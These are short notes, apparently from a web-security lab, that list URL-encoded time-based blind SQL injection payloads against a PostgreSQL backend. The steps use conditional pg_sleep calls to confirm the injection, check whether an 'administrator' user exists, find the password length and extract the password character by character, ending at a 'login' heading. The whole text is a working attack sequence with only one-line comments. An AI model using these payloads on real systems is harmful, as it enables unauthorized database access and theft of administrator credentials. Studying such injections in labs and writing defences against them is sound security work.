#verify that the db sleeps
x';SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
x';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

#verify is administrator exists in table users
x';SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--

#check administrator password lenght
x';SELECT+CASE+WHEN+(username='administrator'+and+length(password)=§0§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--

#bruteforce the administrator password
x';SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)<'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--

#login
